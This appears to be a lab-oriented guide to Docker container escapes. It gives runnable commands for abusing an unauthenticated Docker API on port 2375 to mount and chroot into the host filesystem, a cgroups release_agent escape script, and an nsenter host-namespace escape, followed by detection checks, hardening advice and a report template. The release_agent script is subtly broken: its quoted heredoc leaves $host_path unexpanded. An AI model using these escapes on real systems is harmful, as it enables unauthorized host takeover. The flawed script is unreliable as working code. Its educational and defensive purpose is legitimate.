
# Guide: Common Docker Container Escapes and Exploiting Docker Engine (TCP, cgroups, nsenter)

**Summary**  
This guide consolidates the vulnerabilities and exploits from your material and provides reproducible PoCs, enumeration techniques, checks, and mitigation recommendations. Intended for lab use (e.g., TryHackMe). Use responsibly and only on systems where you have authorization.

---

## Learning Objectives
- Understand common vulnerabilities in Docker containers (capabilities, cgroups, docker.sock, TCP sockets, namespaces).  
- Learn to enumerate and exploit a Docker Engine exposed over TCP (port 2375).  
- Reproduce PoCs for host escape using **cgroups (release_agent)** and **nsenter**.  
- Detect, harden, and audit Docker hosts and containers.

---

## Requirements
- Completed an intro to Docker and comfortable with Linux CLI.  
- Root inside the container (most escapes require elevated privileges).  
- A controlled lab environment (VMs, TryHackMe, etc.).

---

## 1) Default Docker Engine port
- **2375/tcp** (unencrypted, no TLS) — insecure remote API exposure.  
- Note: Docker TLS typically uses **2376**.

---

## 2) Enumeration: detect Docker remote API over TCP
Nmap example:
```bash
nmap -sV -p 2375 10.10.69.101
```

Quick test with curl:
```bash
curl http://10.10.69.101:2375/version
```

A JSON response indicates the daemon is reachable and remote commands are possible.

---

## 3) Interact with a remote Docker daemon from your machine
Point your local `docker` client at the remote host:
```bash
docker -H tcp://10.10.69.101:2375 ps
```

Useful remote operations (attacker perspective):
- `docker -H tcp://HOST:2375 ps` — list containers.
- `docker -H tcp://HOST:2375 images` — list images.
- `docker -H tcp://HOST:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh` — mount host root and chroot.
- `docker -H tcp://HOST:2375 exec -it <container> /bin/sh` — execute inside a container.

**Risk**: An attacker can create/stop/remove containers, mount host paths, or extract data.

---

## 4) PoC: Mount host filesystem via Docker (docker.sock or remote daemon)
**Idea**: Start a container mounting host `/` into the container, then `chroot` into it to operate on host filesystem.

PoC command:
```bash
docker -H tcp://10.10.69.101:2375 run -v /:/mnt --rm -it alpine sh -c "chroot /mnt sh"
```

Explanation:
- `-v /:/mnt` mounts host root at `/mnt` in the new container.
- `chroot /mnt sh` changes root to the host filesystem and spawns a shell.

Notes:
- If the image is not present on the remote host, Docker may pull it (this can produce network activity and detection).
- Very minimal images may lack `chroot` or a full shell.

---

## 5) PoC: cgroups `release_agent` exploit (summary)
**What it abuses**: container capabilities and the kernel cgroup `release_agent` mechanism to execute a script when the cgroup is released.

High-level steps (run only in lab environments):
```bash
# 1. Prepare cgroup mount and directory
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# 2. Tell kernel to run release_agent when cgroup is freed
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. Find host path where container root is stored
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# 4. Point release_agent to an exploit script (path on container mapped to host)
echo "$host_path/exploit" > /tmp/cgrp/release_agent

# 5. Create the exploit script
cat > /exploit <<'EOF'
#!/bin/sh
cat /root/host_flag.txt > "$host_path/flag.txt"
EOF
chmod +x /exploit

# 6. Place a process in the cgroup to trigger execution when cgroup is released
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

Result: When the kernel frees that cgroup, it will invoke the `release_agent`, executing the script in the host context (depending on system protections).

Warnings:
- Requires elevated capabilities (e.g., `CAP_SYS_ADMIN`) or privileged container.
- Modern kernels and configurations may mitigate or disable this attack.

---

## 6) PoC: Namespace escape with `nsenter`
**Idea**: If you can see the host's PID 1 or share namespaces, use `nsenter` to run a shell in the host namespaces.

Requirements:
- `nsenter` must be available inside the container.
- Ability to target PID 1 (host init/systemd).
- Permissions to access target namespaces.

PoC:
```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/bash
```

What it does:
- `--target 1` selects namespaces of PID 1.
- `--mount --uts --ipc --net --pid` enters mount, UTS, IPC, network and PID namespaces.
- The new shell runs in the host's namespace and can interact with the host environment.

Note: This may fail if user namespace remapping or other isolation controls are in place.

---

## 7) Detections and checks from inside a container
- `ps aux` — unusually many processes or presence of host processes indicates host namespace visibility.  
- `ls -la /var/run | grep docker.sock` — detect mounted Docker socket.  
- `mount` / `cat /proc/1/mounts` — inspect mounts and cgroup mounts.  
- `capsh --print` (if installed) — see Linux capabilities.  
- `groups` — check membership in `docker` group.

---

## 8) Quick audit checklist
- Is the Docker API listening on a public interface without TLS (2375)? → No.  
- If remote access is needed, is TLS + mutual authentication enabled? → Yes preferable.  
- Are containers mounting `/var/run/docker.sock`? → Avoid.  
- Are containers running with `--privileged`? → Avoid.  
- Are sensitive host paths mounted (`-v /:/`)? → Avoid.  
- Are unnecessary capabilities granted (`CAP_SYS_ADMIN`, `CAP_SYS_MODULE`)? → Minimize.  
- Is user namespace remapping enabled? → Use it.  
- Are AppArmor/SELinux and seccomp profiles enforced? → Enforce them.  
- Is monitoring/auditing in place for new images and container creation? → Implement logging & alerts.

---

## 9) Mitigations & hardening
- Do **not** expose Docker API via TCP without TLS and authentication.  
- Use TLS with client certificates (mutual TLS) if remote access is needed.  
- Avoid mounting `docker.sock`. If required, restrict and monitor it carefully.  
- Avoid `--privileged`, grant minimal capabilities only.  
- Enable user namespaces (`userns`), AppArmor/SELinux, and seccomp.  
- Scan images for known vulnerabilities; use signed/private registries.  
- Patch kernel and Docker daemon regularly.  
- Implement runtime detection, host integrity monitoring, and audit logs.

---

## 10) Minimal report template
```
# Findings - Docker Escapes (Summary)

- Date: YYYY-MM-DD
- Target: <IP/hostname>
- Identified vectors:
  - Docker daemon listening on 2375/tcp without TLS.
  - Containers with /var/run/docker.sock mounted.
  - Containers running privileged.
- Tests performed:
  - nmap -sV -p 2375 <IP>
  - curl http://<IP>:2375/version
  - docker -H tcp://<IP>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh
- Evidence:
  - curl output, docker ps output, files copied from host.
- Risk: High — remote code execution and host access possible.
- Recommendations:
  - Do not expose 2375 without TLS.
  - Remove privileged containers and socket mounts.
  - Enable userns, AppArmor/SELinux, and use signed registries.
```

## 12) Responsible Use
Perform these actions only in environments where you have explicit permission. Unauthorized use of these techniques is illegal and unethical.

---

*End of guide*
